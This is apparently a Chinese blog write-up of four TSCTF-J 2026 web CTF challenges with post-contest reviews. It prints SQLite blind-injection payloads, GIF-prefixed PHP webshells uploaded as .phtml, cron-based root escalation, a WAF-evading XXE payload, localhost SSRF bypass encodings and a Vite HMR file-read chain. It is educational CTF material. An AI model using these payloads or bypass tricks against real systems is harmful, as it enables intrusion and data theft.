---
title: 【TSCTF-J2026】WP
published: 2026-10-16
description: 第一次打 CTF 正赛的题解与复盘：手工 hex 盲注读表名，图形马翻车后改用 phtml 绕 WAF 拿 RCE 提权读 flag。两道赛场上没做出来的题，赛后也回环境里补完了 —— 一个是 Vite dev server 的 CVE，一个是 XXE 的语义绕过。
tags: [WP, CTF, Web]
category: WP
draft: false
---

> 这篇文章记录的是正赛部分的解题过程。预赛（真实资产挖掘）那部分因为涉及还在披露流程中的目标，暂不上传。
>
> 📑 所有 WP 的总目录在 [WP 索引](/wp/)。

正赛表现很一般，有很多不会的东西，我尽可能将我的解题过程简述，并对遇到的困难进行简单分析与思考
### 一、好想玩原神

1.这道题挺别出心裁的，上来就是一个登录框，尝试信息收集但没发现什么，于是抓包发现账号密码泄露
![图 9](/images/tsctf-2026/01.webp)  
但尝试登陆后并没有发现有用的信息
![图 10](/images/tsctf-2026/02.webp)  


2.登陆界面的操作性很多，尝试sql注入
其中"OperationalError"是SQLite的典型报错
![图 11](/images/tsctf-2026/03.webp)  

3.发现注入点,确认为字符型（and或者or语句之间存在空格过滤，已经自动省略）
```sql
'or'1'='1
```
![图 13](/images/tsctf-2026/04.webp)
```sql
'and'1'='2
```  
![图 15](/images/tsctf-2026/05.webp)  
```sql
'or(select(1))=(1)or'1'='2
```
![图 14](/images/tsctf-2026/06.webp)  

已经确认sqlite数据库，这里打算使用hex来破解，这个比ascii编码更高效(各位师傅复现的时候用复制记得把换行删掉，这里的正确反应应该是200)
```sql
'and((select(substr(hex(substr((select(group_concat(name))from(sqlite_master)where(type)='table'),1,1)),1,1)))like'0')and'1'='1
```
分别对字符串、hex高位低位、十六进制字符进行集束炸弹攻击，得出哈希值，整理后得出表名

字符串用数值1~60，hex用1~2，十六进制0~F（记得把线程数拉低一点）
![图 16](/images/tsctf-2026/07.webp)
![图 0](/images/tsctf-2026/08.webp)  
用长度筛选，右上角保存导出结果表数据.csv文件用excel查看

先对A列分列，长度筛选把无关数据删掉，全选数据进行排序整理
![图 1](/images/tsctf-2026/09.webp)  
插入hex值的行
在E2位置使用
```text
=IF(B2=B3,D2&D3,"")
```
![图 2](/images/tsctf-2026/10.webp)  
下拉得到全部hex值，去解码器解码，得到表名
![图 17](/images/tsctf-2026/11.webp) 

同理得出列名（如果长度不够第一个payload可以拉1~200）
```sql
'and((select(substr(hex(substr((select(sql)from(sqlite_master)where(name)='secret_flags'),1,1)),1,1)))like'0')and'1'='1
```
![图 4](/images/tsctf-2026/12.webp)  

![图 3](/images/tsctf-2026/13.webp)  
再同理得到flag
```sql
'and((select(substr(hex(substr((select(group_concat(flag_value))from(secret_flags)),1,1)),2,1)))like'0')and'1'='1
``` 
![图 21](/images/tsctf-2026/14.webp)  

由于本人并不熟练掌握python，没办法直接写脚本一键爆破，只能用这么曲折的方式了()

#### 赛后复盘（2026-10-17）

> 下面这段是比赛结束后回环境里补的，和上面的赛场过程分开写——想留着当时"卡在哪"的真实状态。

**① 注入点其实在 password 位**

赛场上我一直把 payload 打在 username 上，能打进去，但 UNION 怎么都取不到回显，于是以为这题不考联合注入，转去做盲注。

赛后换到 password 位，一次就通了：

```sql
Windfall2407' UNION SELECT 1,2,3,4'
```

返回两条记录：一条是我注入的 `1,2,3,4`，一条是真实账号行，回显位置一目了然。列数正好 4 列，对应 `phone / traveler / adventure_rank / server`。

**② 为什么 username 位不行、password 位行**

不是 username 拦得严，而是**拼接之后剩下的 SQL 不一样**：

- username 位拼完，后面还接着 `' AND password = '...'`，要截断它得用 `--`，而这题 WAF 拦 `--`
- password 是最后一个参数，后面只剩一个 `'`，补一个引号正好闭合，整句天然自洽

**③ WAF 的规则（实测定出来的）**

- 只拦关键字**左侧**有空白的情况：` and `、` or ` 这种会被拦，`'and`、`)or` 不拦
- 注释符 `--` 也被拦
- 所以所有 payload 都写成关键字紧贴单引号或右括号的形式

**④ 响应其实有五种，不是两种**

| 信号 | 含义 |
|---|---|
| 200 + `items` 非空 | 条件为真 |
| 200 + `items` 为空 | **条件为假**（最坑的一种，只看状态码会误判） |
| 400 + `OperationalError` | 语句执行了但语法错——最好的探针 |
| 403 + 带 `error` 字段 | 被 WAF 拦 |
| 403 + 只有 `redirect` | 正常登录流程走完，账号不在白名单 |

赛场上我是靠响应体长度判断真假的，这一步当时没走错。

**⑤ 补了一版脚本**

Burp 集束炸弹 + Excel 拼 hex 虽然出了 flag，但确实笨。赛后用 Python 重写了：UNION 一条直出，纯盲注读取同样内容只要 8.7 秒。

**⑥ 最该记住的教训**

先做**注入点定位**——哪个参数能注入、它背后还剩什么语法——再选战术。我把"没回显"直接读成了"不支持 UNION"，这是这题最大的误判。

### 二、玛德莱娜的小蛋糕
这道题的难点就是木马的注入和绕过waf

1.题目给出一个文件上传入口，凭直觉识别出是木马题


(错误思路)尝试各种代码想与gif文件结合造出图形马，但是毫无意外的报500（直接改php会被识别出，我用了phtml绕过）

分别用了
  ```php
  GIF89a<?php @eval($_POST['a']); ?>
  ```
   ```php
  GIF89a<?=@$_REQUEST['a'](@$_REQUEST['b']); ?>
  ```
![图 22](/images/tsctf-2026/15.webp) 
配合一张名为1.gif的文件制作图形马
 ```cmd
copy /b 1.gif + shell.php exploit.gif
```
![图 23](/images/tsctf-2026/16.webp) 
但最后上传后查看全是500

查询ai得知是waf抓取文件的二进制流？（有待考证 —— **赛后查清了，见本节末尾的复盘**）

2.转换思路，直接造phtml文件，绕过waf，上传成功，并且不造成500,发现flag
```php
GIF89a<?=@print_r(@scandir('/'))?>
```
![图 24](/images/tsctf-2026/17.webp)  
![图 25](/images/tsctf-2026/18.webp)  

3.但在获取flag时发现权限不足无法访问完整flag，只有一个命令头，尝试绕过权限控制

由Wappalyzer插件可知，服务器系统为linux(Debian是其的发行版)
![图 5](/images/tsctf-2026/19.webp)  
```php
GIF89a<?=system($_GET['c']); ?>
```
利用命令创建phtml文件，上传后确认权限(已拿到RCE)
![图 6](/images/tsctf-2026/20.webp)  
```html
?c=ls%20-la%20/
```
权限600
![图 7](/images/tsctf-2026/21.webp)  
查看 /etc 下的 cron 目录。本来还打算看 cron.daily，结果在 `/etc/cron.d/` 里就撞见了异常：
`teahouse-cleanup` 每分钟以 root 执行 `/opt/teahouse/bin/clean_uploads.sh`。
![图 8](/images/tsctf-2026/22.webp)  
![图 9](/images/tsctf-2026/23.webp)  
顺着 cat 那个脚本，里面有 `source "/var/lib/teahouse/cleanup.conf"` —— source 是按执行者的权限跑的，执行者是 root，而这个 conf 的属主是 www-data，**可写**。
![图 13](/images/tsctf-2026/24.webp)  
![图 12](/images/tsctf-2026/25.webp)  

![图 14](/images/tsctf-2026/26.webp)
写入复制flag命令  
```
?c=echo%20cp%20/flag%20/var/www/html/storage/tmp/o.phtml%20%3E%20/var/lib/teahouse/cleanup.conf
```
写入权限修改命令,直接让它覆写到o.phtml,等待1分钟刷新后访问o.phtml
```
?c=echo%20chmod%20666%20/var/www/html/storage/tmp/o.phtml%20%3E%3E%20/var/lib/teahouse/cleanup.conf
```
 ![图 15](/images/tsctf-2026/27.webp)  

  

#### 赛后复盘（2026-10-17）：那个 500 到底是什么

**① 结论**

和 WAF 无关，和图片大小、后缀也都无关。**是那张图的像素数据里恰好有一对字节 `<?`，而服务端 `short_open_tag=On`。**

PHP 把整张图当脚本解析，吐二进制吐到那个位置，突然遇到 `<?` 就进了代码模式，后面十几 KB 的 GIF 数据全被当代码解析 → Parse error → HTTP 500。

**② 怎么查出来的**

- 把赛场那个马读回来：139381 字节，`GIF89a` 出现**两次**（`copy /b` 把 `shell.php` 自带的 `GIF89a` 也一起拼了进去）
- 写脚本扫所有 `3C 3F`（也就是 `<?`）字节对：`exploit.phtml` 里有 **2 个** —— 一个在我 payload 开头（偏移 139357），另一个在偏移 **127093** 的像素数据里；对照组纯 `real.gif` 是 **0 个**
- 做单字节对照：把偏移 127094 的那个 `?`（0x3F）改成空格（0x20），**其余一个字节都不动** → 500 消失

**③ 为什么"换张图就好了"是个脏实验**

因为换图同时变了两个变量（大小、内容）。真正的验证必须只动一个字节，上面那个实验才算证明了因果。

**④ 顺带纠正两处**

- 当时以为"用 `<?php` 长标签就能躲开"，其实不行：**`short_open_tag=On` 的时候，裸 `<?` 一样是开标签**
- `.phtml` 这个绕过是真的：后缀黑名单只拦 `.php` / `.php5`

**⑤ 两道检查的提示语不一样**

| 触发 | 提示 |
|---|---|
| 后缀命中黑名单 | 「这个后缀会弄脏茶桌。」 |
| 内容命中 `<?php` | 「管家闻到了太浓的PHP味道。」 |

两句话完全不同，说明是两套独立检查 —— 所以必须过两道门：换 `.phtml` 躲第一道，用 `<?=` 躲第二道。

**⑥ 提权那条链的完整形态**

`/etc/cron.d/teahouse-cleanup` 的内容是：

```
* * * * * root /bin/bash /opt/teahouse/bin/clean_uploads.sh >> /var/log/teahouse-cleanup.log 2>&1
```

而脚本里有 `source "/var/lib/teahouse/cleanup.conf"` —— **source 是按执行者权限跑的，执行者是 root**，所以写这个 conf 等于以 root 执行。它的属主是 `www-data`，可写。

顺带说明：这个 conf 是**题目自带**的（40 字节，镜像构建日 Oct 5），不是我创建的。

**⑦ 清理周期是测出来的**

cron 每分钟跑一次，脚本按 `-mmin +3` 清理，也就是文件大概活 3 分钟。想知道周期，传一个 canary 文件定时轮询，看它什么时候消失就行。

## 赛场上没解出来的两题（赛后都打通了）

### 三、bandinvite


这题是一个后台题，题目给了一个后台的登录入口
注册账号成为普通用户，查询js文件，获取前端路由与接口定义
![图 16](/images/tsctf-2026/28.webp)  

普通用户无法浏览后台重要内容，尝试越权

1.尝试直接解码jwt将user改为admin
![图 17](/images/tsctf-2026/29.webp)  
![图 18](/images/tsctf-2026/30.webp)  


2.算法混淆（alg: none）：构造 {"alg": "none", "typ": "JWT"}，删除签名（失败，后端强制使用 HS256，返回 401）
![图 21](/images/tsctf-2026/31.webp)  
![图 22](/images/tsctf-2026/32.webp)  
没有kid 注入：检查 JWT Header，确认没有 kid 参数，不存在路径穿越或 SQL 注入的可能

3.弱密钥离线爆破：使用vulnclaw，直接命令本地离线爆破（失败，密钥不是常见弱口令）


4.ip伪造xff等均无效
![图 19](/images/tsctf-2026/33.webp)  

5.vite任意文件读取，尝试利用 @fs/ 读取 /app/frontend/vite.config.js, /app/backend/app.py, /etc/passwd 等敏感文件（均为404）
![图 20](/images/tsctf-2026/34.webp)  


思考：按照出题人的提示，这应该是ssti漏洞，但我并没有找到除了管理员外的其他用户能访问/api/previwe触发ssti的入口，尝试了多种方法都没有成功，可能是我对ssti漏洞的理解不够深入，或者是题目本身有一些隐藏的条件没有被满足

如果不是提权的话，可能是我在信息收集阶段遗漏了某些关键点，导致无法触发漏洞

#### 赛后复盘（2026-10-21）：这题终于打通了

**① 赛场卡在哪**

我一直以为要**自己签一个 admin token**。改 payload、`alg:none`、离线爆破七千多万次全都没用，因为密钥是强随机的。

真正的入口不是"伪造凭证"，而是**找到一张别人已经签好的票**。

**② 完整链路**

1. 前端把 Vite dev server 暴露在生产环境了：页面里有 `<script type="module" src="/@vite/client">`，读 `/package.json` 能看到 `vite: 8.0.4`
2. 对应 **CVE-2026-39363**：Vite 开发服务器的 HMR WebSocket 没有鉴权。HTTP 那条 `/@fs/` 受 `server.fs.allow` 白名单限制，但 WebSocket 那条 `vite:invoke` → `fetchModule` 走的不是同一套检查
3. 用它读 `/run/starry/dispatch-note.txt`，拿到 ticket `handoff-9c2e7b41`

   > 第一次跑报 404，原因是脚本 `wrap_socket` 时没传 `server_hostname`，不发 SNI，平台的 TLS 前置不知道该回哪个站点。

4. `GET /api/dispatch/roster?ticket=...` 先看排班，确认 `shift-0727` 是 open
5. `POST /api/dispatch/shift-0727/claim?ticket=...` → `{"ok":true,"role":"admin"}`

   > 两个坑：**必须先 GET roster 再 claim**（否则报 `roster confirmation required`），而且必须**同一个 session**

6. 提权之后能访问 `/api/preview`，但它**不回显渲染结果**，只返回一个 `status` 字段
7. 只有 `draft` 会被 Jinja2 当模板渲染：`{{7*7}}` → `archived`，`{{1/0}}` → `failed`
8. 于是用 `{% if 条件 %}A{% else %}{{1/0}}{% endif %}` 把布尔值转成 `status`，一位一位盲读
9. flag：`TSCTF-J{sTArZy_V1T3_63ckST493-b0cCHI46acdae0}`

**③ 几处诚实的说明**

- 第 1 步的线索（`dispatch-note.txt`、`roster`、`/run/starry`）赛场就写在前端 JS 里，但那几行是**中文乱码**，我当时以为只是某段普通文本，没解码 → 这是我最该改的习惯：**看到乱码先解码**
- 第 2 步的 CVE 是赛后看公开题解才知道的
- 盲读那一步是用脚本跑的，条件和二分怎么设计也是脚本完成的

**④ 学到的东西**

我原来的判断标准是"这个字符串有没有对应的 API"，`/run/starry/xxx.txt` 是个文件路径、不是接口，就被我排除了。**线索的价值不在于它是不是接口，而在于它为什么会出现在这里。**

### 四、mineprotrait

这题是一道xxe?

1、我通过爬虫发现www.zip


![图 23](/images/tsctf-2026/35.webp)  
里面有出题人提供的账号和密码，也有flag的信息
![图 24](/images/tsctf-2026/36.webp)  
![图 25](/images/tsctf-2026/37.webp)  


2、登陆账号后发现图片格式转换器
   抓包发现：目标格式为 JPG/WEBP 时，由前端 JS 完成本地转换（不走网络请求）；目标格式为 PNG 时，表单才真正发往后端/convert 接口（由后端渲染器解析 SVG 并回传 Base64 图片）
![图 26](/images/tsctf-2026/38.webp)  

3、 推断为漏洞XXE

通过审计 /convert 的后端处理逻辑，结合 old_note.txt 中的提示，推断后端在解析 SVG 时存在 XXE（XML 外部实体注入）漏洞尝试构造标准 XXE Payload：

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]>
```

尝试将其放入 <text> 标签内渲染。

4、 对抗过程与绕过尝试（所有尝试均被死锁）

标准 XXE 被 WAF 拦截

直接上传包含 <!DOCTYPE 和 <!ENTITY 的 UTF-8 SVG，被 WAF 拦截，后端返回 4280 长度的图片，OCR 识别提示：“The Junimos found sensitive keywords within your XML. Go refine it!”
![图 27](/images/tsctf-2026/39.webp)  

waf设置了针对 <!DOCTYPE、<!ENTITY 等正则关键字的黑名单

编码绕过（尝试了所有已知编码）

UTF-16 LE/BE + BOM：WAF 成功绕过（长度变为 3601 兜底图，非 WAF 拦截），但后端 Python 渲染器（CairoSVG）无法解析 UTF-16 编码，抛出异常

UTF-32 LE + BOM：同上，WAF 放行，但渲染器崩溃
![图 29](/images/tsctf-2026/40.webp)  

UTF-7：+ADw-!DOCTYPE 形式被 WAF 识别并拦截（触发了敏感词），说明 WAF 具备多编码解码能力
![图 28](/images/tsctf-2026/41.webp)  

XInclude：<xi:include href="php://filter/..."> 绕过 WAF（无敏感词），但渲染器完全不支持 XInclude 标签，直接崩溃

Gzip 压缩：尝试 Content-Encoding: gzip，但后端 Python BaseHTTP 服务器未开启 gzip 解码支持

SSRF 内网探测绕过
尝试利用渲染器 SSRF 请求内网 fetch.php：将 <image href="http://127.0.0.1:8080/fetch.php?..."> 注入 SVG

IP 黑名单绕过：WAF 拦截 127.0.0.1 等常见本机地址，尝试 localtest.me、0.0.0.0、0x7f000001 等绕过
fetch.php 返回的是纯文本的 Base64 flag，而渲染器必须拿到合法的图片流，遇到纯文本直接崩溃

控制变量测试（确认渲染器本身正常）

上传不含 XXE 恶意代码的纯文本 SVG（<text>Hello TSCTF</text>，纯 UTF-8），后端成功渲染并回显图片
证明渲染器（CairoSVG）本身工作正常，未损坏
![图 30](/images/tsctf-2026/42.webp)  

 异常吞没机制
无论哪种绕过方式（UTF-16、UTF-7、XInclude、SSRF），最终返回的都是 3600 长度的兜底空白图（“Portrait conversion completed”）。
后端代码使用了 try...except，当渲染器崩溃时，异常被强行捕获并吞掉，系统为了不报错，返回了固定的兜底占位图

死锁闭环
纯 UTF-8 + XXE -> WAF 拦截（4280）
非 UTF-8（绕过 WAF） -> 渲染器崩溃 + 异常被吞 -> 3600 兜底图
前端本地转换（JPG/WEBP） -> 未发往后端，无法触发 XXE。

思考：在当前靶机环境下，WAF 的严格拦截与后端渲染器“吞掉所有非 UTF-8 异常”的机制产生了不可调和的冲突，导致任何 XXE 或 SSRF 的回显通道被堵死，可能别人有办法能够在绕过waf的同时得到回显吧，但是我没能找到

#### 赛后复盘（2026-10-21）：拿到 flag 了

**① 方向错在哪**

我一直在换**编码**（UTF-16/32、UTF-7、gzip），想让 WAF 认不出来。

但真正该换的是**写法**。

**② 正解：在 `<!` 和 `DOCTYPE` 之间插一个空格**

```xml
<! DOCTYPE svg [ <! ENTITY xxe SYSTEM "http://0/fetch.php?url=php://filter/resource=/flag.txt"> ]>
<svg height="900" width="900"><text x="10" y="40" font-size="14">&xxe;</text></svg>
```

对 XML 解析器来说，`<!` 和 `DOCTYPE` 之间有空白是合法的；对 WAF 来说，它匹配的是连在一起的字符串 `<!DOCTYPE`，对不上就放行了。

**同一份内容，字符串只有一种长相，语法却允许多种写法** —— 差异就在这儿。

**③ 为什么非要绕 `fetch.php`**

渲染器是 Python 的 CairoSVG，**它不认 `php://filter` 这个协议**。所以要让 PHP 端点的 `url` 参数去读文件，再由渲染器把返回的内容当文本画出来。

**④ 本机地址怎么绕**

`127.0.0.1` 被后端的远程媒体 URL 检查拦下（会回一条 `Remote media URL rejected`）。改用 **`0`** —— 在 Linux 里 `0` 会被解析成 `0.0.0.0`，内核当成"连本机"处理。

**⑤ 回显走哪条通道**

把实体引用放进 `<text>`，让它当**文字**被画出来。我第一次把 `&xxe;` 放进 `<image href>`，那条路要的是合法图片流，遇到纯文本直接崩 —— **出口选错，比 payload 写错更常见。**

**⑥ 一份小表：`<!DOCTYPE` 的多种合法写法**

| 写法 | 结果 |
|---|---|
| `<!DOCTYPE` | ✕ 拦 |
| `<!doctype` / `<!DoCtYpE` | ✕ 拦 |
| `<! DOCTYPE`（一个空格） | ✓ 过 |
| `<!  DOCTYPE`（两个空格） | ✓ 过 |
| `<!<TAB>DOCTYPE` | ✓ 过 |
| `<!-- <!DOCTYPE svg> -->` | ✓ 过 |
| `<!-- <!-- <!DOCTYPE svg> --> -->` | ✓ 过 |
| `<![CDATA[ <!DOCTYPE ]]>` | ✕ 拦 |

**⑦ 本机地址的多种写法**

`0`、`2130706433`（十进制）、`0x7f000001`（十六进制）、`0177.0.0.1`（八进制）、`0x7f.1`、`127%2e0%2e0%2e1`、`[::ffff:7f00:1]` 都能到本机；`127.0.0.1`、`localhost`、`0.0.0.0`、`0.0`、`0.` 被拦。

最扎眼的一条是：**带点的全被封了，单个 `0` 反而放行** —— 因为它拦的不是"本机地址"，而是"点分数字"这个字符串形状。

**⑧ flag**

`TSCTF-J{d2580556-c88e-c6cc-d171-72a49b0d5c0f}`

> 一开始我用 base64 回显，图片上的字符靠肉眼看，末尾还读错过一位。后来改成直接读明文，一屏 PHP Warning 里就带着 flag。**回显通道能选明文，就别套一层 base64。**

## 总结

我目前的基础尚未牢固，还有很多地方才刚入门，遇到了很多超出能力的问题，但我并不打算因此放弃，我后续还想投入时间继续提高自身的能力

尽管本次比赛在电脑前坐牢了几十个小时，但这也是在不断学习的过程，也算有了一些收获吧，以后还想参加ctf

我发现这种比赛没人带会非常艰难，无论是信息的获取还是方向的直到，新手还是有点难分辨哪些是有用的，学起来的顺序也比较杂乱，只能说希望能得到更系统的学习

补一句赛后的感受：比赛时卡住的地方，赛后在环境里基本都补完了。回头看，"这题会不会"的差别往往只在有没有多做一步——把失败的图片再读一遍字节、把那段乱码解一次码。当时觉得是运气，其实是不肯多看一眼。

最后感谢你的观看
